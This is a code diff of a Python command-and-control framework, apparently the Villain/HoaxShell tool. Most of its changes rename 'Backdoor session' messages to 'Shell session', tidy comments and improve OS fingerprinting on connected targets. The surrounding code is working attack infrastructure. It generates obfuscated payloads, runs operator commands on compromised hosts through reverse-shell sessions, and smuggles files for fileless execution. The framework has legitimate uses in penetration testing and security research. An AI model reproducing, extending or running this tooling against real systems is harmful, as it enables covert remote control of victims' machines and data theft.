@@ -9,7 +9,6 @@
 import ssl, struct
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from warnings import filterwarnings
-from datetime import date, datetime
 from ast import literal_eval
 from .common import *
 from .settings import *
@@ -209,12 +208,7 @@ class Payload_Generator:
 						del payload, template
 						return
 
-					#if payload.meta['handler'] == 'hoaxshell' or not Payload_Generator_Settings.validate_lhost_as_ip:
 					self.parse_lhost(payload, args_dict["lhost"])
-						#payload.parameters["lhost"] = args_dict["lhost"] if (not payload.parameters["lhost"] and (len(args_dict["lhost"]) < 255)) else payload.parameters["lhost"]
-			   	 
-					# else:
-					# 	self.parse_lhost(payload, args_dict["lhost"])
 
 					if not payload.parameters["lhost"]:
 						print('Error parsing LHOST. Invalid IP, Hostname or Interface.')
@@ -229,7 +223,7 @@ class Payload_Generator:
 					return
 
 			# Process payload template
-			print(f'Generating backdoor payload...')
+			print(f'Generating payload...')
 
 			if payload.meta['handler'] == 'hoaxshell':
 				self.compute_hoaxshell(payload, args_dict)
@@ -312,7 +306,6 @@ class Obfuscator:
 		path = randint(1,3)
 
 		if char.isalpha():
-
 			if path == 1:
 				return char
 
@@ -370,18 +363,15 @@ class Obfuscator:
 					chars_left = (str_length - chars_used)
 
 					if chars_left:
-
 						pair_length = randint(1, chars_left)
 						regex += '['
 
 						for i in range(c, pair_length + c):
-
 							masked = self.mask_char(string[i])
 							regex += masked
 							c += 1
 
 						chars_used += pair_length
-
 						regex += ']{' + str(pair_length) + '}'
 
 					else:
@@ -408,16 +398,13 @@ class Obfuscator:
 		c = 0
 
 		while True:
-
 			chars_left = (str_length - chars_used)
 
 			if chars_left:
-
 				pair_length = randint(1, chars_left)
 				concat += "'"
 
 				for i in range(c, pair_length + c):
-
 					concat += string[i]
 					c += 1
 
@@ -460,7 +447,6 @@ class Obfuscator:
 
 			if (obf in self.restricted_var_names) or (obf in self.used_var_names):
 				continue
-
 			else:
 				self.used_var_names.append(obf)
 				legal = True
@@ -910,12 +896,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			response = Core_Server.send_receive_one_encrypted(session_owner_id, req_data, 'set_redirector', Core_Server_Settings.timeout_for_command_output)
 
 			Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, '')
-			# Request the latest prompt value from the session owner
-			# current_prompt_val = Core_Server.request_prompt_value(session_id)
 
 		if listener == 'hoaxshell':
 			Main_prompt.hoax_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
-			prompt = Main_prompt.hoax_prompt
 		else:
 			Hoaxshell.command_pool[Hoaxshell.active_shell].append('') 
 
@@ -937,7 +920,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 							if is_remote_shell:
 								Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, '')
 							else:
-								# print('\r') if not user_input.strip('\r\t\n ') and shell_type == 'powershell.exe' else do_nothing()
 								Hoaxshell.command_pool[Hoaxshell.active_shell].append('')
 						else:
 							continue
@@ -1077,10 +1059,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 						continue
 
-					# Run as shell command
+					# Run user input as shell command
 					else:
-						# print('\r') if not user_input.strip('\r\t\n ') and shell_type == 'powershell.exe' else do_nothing()
-
 						if Hoaxshell.active_shell:
 							Hoaxshell.prompt_ready = False
 
@@ -1100,20 +1080,15 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 								# Append command for execution
 								if is_remote_shell:
-									# print('\r', end = '')
 									Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, user_input)
 
 								else:
 									Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)
-
-
 						else:
 							print(f'\rNo active session.')
-
 				else:
 					sleep(0.1)
 					continue
-
 			else:
 				raise KeyboardInterrupt
 
@@ -1211,9 +1186,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 
 		# Verify execution
-		# url_split = self.path.strip("/").split("/")
-		# if url_split[0] in Hoaxshell.verify and legit:
-
 		url_split = self.path.strip("/").split("/")
 
 		if (url_split[0] in Sessions_Manager.verify and legit) or \
@@ -1233,12 +1205,12 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			try:
 				Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]
 				Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]
-				print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session {session_id} established on {ORANGE}{self.client_address[0]}{END}')
+				print_to_prompt(f'\r[{GREEN}Shell{END}][{session_id}] New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()}.')
 
 			except IndexError:
 				Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'
 				Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'
-				print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session {session_id} established on {ORANGE}{self.client_address[0]}{END} (hostname and user undefined)')
+				print_to_prompt(f'\r[{GREEN}Shell{END}][{session_id}] New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')
 		   	 
 			try:
 				Thread(target = self.monitor_shell_state, args = (session_id,), name = f'session_state_monitor_{self.client_address[0]}', daemon = True).start()
@@ -1264,12 +1236,12 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 			if len(Hoaxshell.command_pool[session_id]):
 
-				villain_issued_cmd = False
+				# villain_issued_cmd = False
 				cmd = Hoaxshell.command_pool[session_id].pop(0)
 
 				# Check command type:
-				# type str = normal
-				# type dict = Villain issued cmd
+				# 1. type str = normal
+				# 2. type dict = Villain issued cmd
 
 				if isinstance(cmd, dict):
 					# villain_issued_cmd = True
@@ -1289,7 +1261,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		else:
 			self.send_response(200)
 			self.end_headers()
-			self.wfile.write(b'exit 1') # kills crippled hoaxshell sessions that continue to spam requests
+			self.wfile.write(b'')
+			# self.wfile.write(b'exit 1') # kills crippled hoaxshell sessions that continue to spam requests
 			pass
 
 
@@ -1777,7 +1750,7 @@ class Core_Server:
 						new_session_id = decrypted_data[1]['session_id']
 						decrypted_data[1].pop('session_id', None)
 						Sessions_Manager.active_sessions[new_session_id] = decrypted_data[1]
-						print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session {new_session_id} established on {ORANGE}{Sessions_Manager.active_sessions[new_session_id]["IP Address"]}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
+						print_to_prompt(f'\r[{GREEN}Shell{END}][{new_session_id}] New session established -> {ORANGE}{Sessions_Manager.active_sessions[new_session_id]["IP Address"]}{END} at {get_datetime()} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}).')
 						del decrypted_data, new_session_id
 						Core_Server.send_msg(conn, self.response_ack(sibling_id))
 
@@ -1798,7 +1771,7 @@ class Core_Server:
 						else:
 							status = f'{ORANGE}Undefined{END}'
 
-						print(f'\r[{INFO}] Backdoor session {ORANGE}{session_id}{END} status changed to {status}.')
+						print(f'\r[{INFO}] Shell session {ORANGE}{session_id}{END} status changed to {status}.')
 						Core_Server.restore_prompt_after_lost_conn(decrypted_data[1]['session_id'])
 						del session_id, status
 
@@ -1808,7 +1781,7 @@ class Core_Server:
 
 						victim_ip = Sessions_Manager.active_sessions[decrypted_data[1]['session_id']]['IP Address']
 						Sessions_Manager.active_sessions.pop(decrypted_data[1]['session_id'], None)
-						print(f'\r[{INFO}] Backdoor session on {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
+						print(f'\r[{INFO}] Shell session on {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
 
 						if Hoaxshell.active_shell == decrypted_data[1]['session_id']:
 							Hoaxshell.deactivate_shell()
@@ -1844,7 +1817,7 @@ class Core_Server:
 
 						lost_sessions = len(lost_session_ids)
 						print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')
-						print(f'\r[{WARN}] {lost_sessions} x backdoor sessions lost.') if lost_sessions else do_nothing()
+						print(f'\r[{WARN}] {lost_sessions} x shell sessions lost.') if lost_sessions else do_nothing()
 
 						# Check if there was an active shell against a lost session
 						for sid in lost_session_ids:
@@ -2467,7 +2440,7 @@ class TCP_Sock_Multi_Handler:
 
 
 
-	def os_fingerprint(self, init_response, prompt_val):
+	def os_fingerprint(self, init_response, prompt_val, conn):
 		'''	Detect the operating system and shell environment from the response of the target system
 		based on symbols, prompt structures, and common environment clues. '''
 		try:
@@ -2491,8 +2464,18 @@ class TCP_Sock_Multi_Handler:
 					return [True, 'Linux', 'zsh']
 				return [True, 'Linux', 'unix']  
 
-			# Fallback case for unidentified OS or shell
-			return [False, False, False]
+			# Desperate attempt to specify if Win or Unix
+			conn.sendall('{}\n'.format('uname').encode('utf-8'))
+			res = self.recv_timeout(conn, quiet = True, timeout = 2)
+			if re.search('Linux', res):
+				return [True, 'Linux', 'unix'] 
+			elif re.search("The term 'uname' is not recognized", res):
+				return [True, 'Windows', 'powershell.exe']
+			elif re.search("'uname' is not recognized", res):
+				return [True, 'Windows', 'cmd.exe']
+			else:
+				# Fallback case for unidentified OS or shell
+				return [False, False, False]
 
 		except Exception as e:
 			return [False, False, False]
@@ -2513,7 +2496,6 @@ class TCP_Sock_Multi_Handler:
 			# Identify the OS, Hostname and User
 			cmd_echo = False
 			hostname_undefined = False
-			# ansi_detected = False
 			username = ''
 			ident_stat = True
 			broken_pipe = 0
@@ -2535,7 +2517,7 @@ class TCP_Sock_Multi_Handler:
 				prompt_val = self.recv_timeout(conn, quiet = True, timeout = 2)
 
 				# Try to fingerprint OS
-				os_fingerprint = self.os_fingerprint(init_response, prompt_val)
+				os_fingerprint = self.os_fingerprint(init_response, prompt_val, conn)
 
 				# Characterize OS and shell type
 				if not os_fingerprint:
@@ -2547,11 +2529,9 @@ class TCP_Sock_Multi_Handler:
 
 				if broken_pipe <= 1:
 					broken_pipe += 1
-					# continue
 
 				else:
 					ident_stat = 'BrokenPipeError'
-					# break
 
 			if username in ['ConnectionResetError']:
 				ident_stat = 'ConnectionResetError'
@@ -2580,8 +2560,8 @@ class TCP_Sock_Multi_Handler:
 				else:
 					username = username.split('\n')[0].strip()
 				
-				conn.sendall('{}\n'.format('echo "***$(hostname)***"').encode('utf-8')) # get hostname value
-				response = self.recv_timeout(conn, quiet = True, timeout = 3) #self.recv_any(conn)
+				conn.sendall('{}\n'.format('echo "***$(hostname)***"').encode('utf-8')) 
+				response = self.recv_timeout(conn, quiet = True, timeout = 3) 
 				response = self.remove_non_print(self.clean_nc_response(response))
 				# Remove command echo if detected
 				response = response.split('***$(hostname)***')[-1] if re.search(re.escape('***$(hostname)***'), response) else response
@@ -2635,7 +2615,7 @@ class TCP_Sock_Multi_Handler:
 			}
 
 			Hoaxshell.command_pool[session_id] = []
-			print_to_prompt(f'\r[{GREEN}Shell{END}] Backdoor session {session_id} established on {ORANGE}{address[0]}{END}')
+			print_to_prompt(f'\r[{GREEN}Shell{END}][{session_id}] New session established -> {ORANGE}{address[0]}{END} at {get_datetime()}.')
 			print_to_prompt(f'\r[{WARN}] Failed to resolve hostname. Use "repair" to declare it manually.') if hostname_undefined else do_nothing()
 
 			new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])
@@ -2650,7 +2630,7 @@ class TCP_Sock_Multi_Handler:
 
 		except Exception as e:
 			conn.close()
-			print_to_prompt(f'\r[{ERR}] Failed to establish a backdoor session: {e}.') if session_id not in Sessions_Manager.sessions_graveyard \
+			print_to_prompt(f'\r[{ERR}] Failed to establish a shell session: {e}.') if session_id not in Sessions_Manager.sessions_graveyard \
 			else do_nothing()
 			Threading_params.thread_limiter.release()
 			return
@@ -2675,7 +2655,7 @@ class TCP_Sock_Multi_Handler:
 				if Hoaxshell.command_pool[session_id]:
 
 					cmd = Hoaxshell.command_pool[session_id].pop(0)
-					# Maybe this does not need to run again here, its checked just before this if.
+
 					# issuer = 'self' if session_id == Hoaxshell.active_shell else None
 					# if session_id in Sessions_Manager.shell_redirectors.keys():
 					# 	issuer = Sessions_Manager.shell_redirectors[session_id]					 
@@ -2695,7 +2675,6 @@ class TCP_Sock_Multi_Handler:
 
 					Sessions_Manager.active_sessions[session_id]['last_issued_cmd'] = cmd
 					
-					''' Append auxiliary commands '''
 					# If the session is powershell.exe, wrap the command in a try - catch block
 					# to ensure stderror will be delivered
 					if not villain_issued_cmd and shell == 'powershell.exe':
@@ -2723,7 +2702,7 @@ class TCP_Sock_Multi_Handler:
 						Sessions_Manager.active_sessions[session_id]['Status'] = 'Lost'
 						status = f'{LRED}Lost{END}'
 						Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})
-						print(f'\r[{INFO}] Connection with backdoor session {ORANGE}{session_id}{END} seems to be {status}.') if session_id not in Sessions_Manager.sessions_graveyard \
+						print(f'\r[{INFO}] Connection with shell session {ORANGE}{session_id}{END} seems to be {status}.') if session_id not in Sessions_Manager.sessions_graveyard \
 						else do_nothing()
 						Core_Server.restore_prompt_after_lost_conn(session_id)
 						return
@@ -2732,7 +2711,7 @@ class TCP_Sock_Multi_Handler:
 						if Sessions_Manager.active_sessions[session_id]['Status'] != 'Active':
 							Sessions_Manager.active_sessions[session_id]['Status'] = 'Active'
 							Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})
-							print(f'\r[{INFO}] Connection with backdoor session {ORANGE}{session_id}{END} restored!')
+							print(f'\r[{INFO}] Connection with shell session {ORANGE}{session_id}{END} restored!')
 							Core_Server.restore_prompt_after_lost_conn(session_id)
 
 					del cmd
@@ -2791,8 +2770,7 @@ class TCP_Sock_Multi_Handler:
 				output = output.decode('utf-8', 'ignore')
 
 				if output:
-					# print(f'{GREEN}{output}{END}')
-					user_issued_cmd = Sessions_Manager.active_sessions[session_id]['last_issued_cmd']
+					user_issued_cmd = Sessions_Manager.active_sessions[session_id]['last_issued_cmd'].rstrip()
 
 					# Command echo filter
 					if echo and user_issued_cmd.strip():
@@ -2805,7 +2783,7 @@ class TCP_Sock_Multi_Handler:
 						Core_Server.send_receive_one_encrypted(issuer, [output, '', session_id, False], 'command_output', 30) if output else do_nothing()
 				
 				Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
-				return output #self.clean_nc_response(output) if shell_type else output
+				return output 
 
 
 
@@ -2959,7 +2937,7 @@ class TCP_Sock_Multi_Handler:
 					Sessions_Manager.active_sessions[session_id]['Status'] = 'Lost'
 					status = f'{LRED}Lost{END}'
 					Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})
-					print(f'\r[{INFO}] Connection with backdoor session {ORANGE}{session_id}{END} seems to be {status}.')
+					print(f'\r[{INFO}] Connection with shell session {ORANGE}{session_id}{END} seems to be {status}.')
 					Core_Server.restore_prompt_after_lost_conn(session_id)
 					break
 
@@ -3027,22 +3005,12 @@ class TCP_Sock_Multi_Handler:
 
 				elif shell_type == 'zsh':
 					try:
-						# print(repr(chunk))
 						sliced = chunk.rsplit('\r\n\r\n', 1)
 						print(sliced)
 						prompt = ''.join(sliced[-2:])
 						data = ''.join(sliced[0:-2])
-						# print(f'PROMPT: {prompt}')
-						# print(f'DATA: {data}')
-						# print('****')
-						# print(chunk.rsplit('\r\n', 2))
-						# print('****')
-						# print([True, [''.join(sliced[:-2]), ''.join(sliced[-2:])], shell_type])
-						# print([True, [data, prompt], shell_type])
 						return [True, [data, prompt], shell_type]
-						# return [True, ['', chunk], shell_type]
 					except Exception as e:
-						print('malakia')
 						return [True, ['', chunk], shell_type]
 
 		return [False]
@@ -3360,7 +3328,7 @@ class File_Smuggler:
 		# Determine shell type
 		shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
 		if shell_type not in File_Smuggler.Utilities['upload']['supported']:
-			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{INFO}] Script execution not supported for shell type: {shell_type}')
+			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{INFO}] Script execution not supported for shell type "{shell_type}"')
 			return
 
 		try:
@@ -3401,7 +3369,7 @@ class File_Smuggler:
 			# Determine shell type
 			shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
 			if shell_type not in File_Smuggler.Utilities['fileless_exec']['supported']:
-				File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{INFO}] Script execution not supported for shell type: {shell_type}')
+				File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{INFO}] Script execution not supported for shell type "{shell_type}"')
 				return
 
 			# Create smuggle ticket
@@ -3428,7 +3396,7 @@ class File_Smuggler:
 			Hoaxshell.command_pool[session_id].append(villain_cmd)
 
 		except Exception as e:
-			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Exec function failed: {e}')
+			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{ERR}] Fileless exec function failed: {e}')
 
 
 
@@ -3448,7 +3416,6 @@ def restore_prompt():
 
 	if Hoaxshell.active_shell:
 		Hoaxshell.rst_shell_prompt() if Hoaxshell.prompt_ready else Hoaxshell.set_shell_prompt_ready()
-
 	else:
 		Main_prompt.rst_prompt() if Main_prompt.ready else Main_prompt.set_main_prompt_ready()
 
